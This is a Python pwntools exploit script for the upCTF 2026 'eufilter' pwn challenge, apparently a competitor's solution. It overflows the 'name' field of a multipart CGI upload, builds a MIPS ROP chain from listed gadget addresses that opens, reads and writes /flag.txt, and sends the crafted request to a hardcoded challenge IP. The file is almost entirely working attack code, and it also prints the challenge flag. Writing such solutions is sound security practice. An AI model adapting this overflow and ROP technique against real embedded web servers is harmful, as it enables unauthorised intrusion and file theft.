#!/usr/bin/env python3
"""
Challenge: eufilter — upCTF 2026
Category:  pwn (MIPS ROP via CGI multipart overflow)
Flag:      upCTF{jus7_s4y_1ts_f0r_7h3_ch1ldr3n-gBDUIEk0b1a10c12}
"""
from pwn import *
import struct, re

HOST, PORT = "46.225.117.62", 30001

# === MIPS big-endian helpers ===
def p32be(x): return struct.pack('>I', x)

# === ROP gadgets (selftest dead code region 0x400a70-0x400b00) ===
# Pattern: lw REG, 8(sp); lw ra, 0xc(sp); sp+=0x10; jr ra
LW_V0 = 0x400a74   # set syscall number
LW_A0 = 0x400a8c   # set arg0
LW_A1 = 0x400aa4   # set arg1
LW_A2 = 0x400abc   # set arg2
SYSCALL = 0x400aec  # syscall; lw ra, 8(sp); sp+=0x10; jr ra

# === Constants ===
SYS_OPEN, SYS_READ, SYS_WRITE = 4005, 4003, 4004
G_ID_PHOTO = 0x411740   # BSS — controlled via id_photo multipart field
FLAG_BUF   = 0x511744   # BSS (g_body) — read flag here

# === ROP frame helper ===
def frame(val, nxt):
    return p32be(0) + p32be(0) + p32be(val) + p32be(nxt)

# === Build overflow payload ===
# name buffer at handle_verify fp+0x34, saved fp at fp+0x78, saved ra at fp+0x7c
# After epilogue: sp = fp+0x80, chain data starts at payload[76] = fp+0x80
payload  = b'A' * 68              # padding to saved fp
payload += p32be(0x41414141)      # fake fp (unused)
payload += p32be(LW_V0)          # overwrite ra → first gadget

# open("/flag.txt", 0) → fd=3
payload += frame(SYS_OPEN, LW_A0)
payload += frame(G_ID_PHOTO, LW_A1)     # a0 = "/flag.txt" (in g_id_photo)
payload += frame(0, SYSCALL)             # a1 = O_RDONLY
payload += frame(LW_V0, 0)              # after open syscall

# read(3, buf, 256)
payload += frame(SYS_READ, LW_A0)
payload += frame(3, LW_A1)              # fd=3 (hardcoded, stdin/out/err = 0/1/2)
payload += frame(FLAG_BUF, LW_A2)
payload += frame(0x100, SYSCALL)
payload += frame(LW_V0, 0)

# write(1, buf, 256) → stdout
payload += frame(SYS_WRITE, LW_A0)
payload += frame(1, LW_A1)
payload += frame(FLAG_BUF, LW_A2)
payload += frame(0x100, SYSCALL)
payload += p32be(0) * 8                 # tail padding

# === Multipart POST body ===
body  = b'------B\r\nContent-Disposition: form-data; name="name"\r\n\r\n'
body += payload
body += b'\r\n------B\r\n'
body += b'Content-Disposition: form-data; name="id_photo"; filename="p.jpg"\r\n'
body += b'Content-Type: image/jpeg\r\n\r\n'
body += b'/flag.txt\x00'                 # string for open() stored in g_id_photo
body += b'\r\n------B--\r\n'

# === Send ===
if args.REMOTE:
    h, p = HOST, PORT
else:
    h, p = "localhost", 4006

s = remote(h, p)
req  = f"POST /cgi-bin/eufilter.cgi?url=x HTTP/1.1\r\n"
req += f"Host: {h}:{p}\r\n"
req += f"Content-Type: multipart/form-data; boundary=----B\r\n"
req += f"Content-Length: {len(body)}\r\n"
req += f"Connection: close\r\n\r\n"
s.send(req.encode() + body)
sleep(2)
data = s.recv(16384, timeout=5)
s.close()

m = re.search(rb'upCTF\{[^\}]+\}', data)
if m:
    log.success(f"FLAG: {m.group().decode()}")
else:
    log.warn(f"No flag found. Response: {data}")
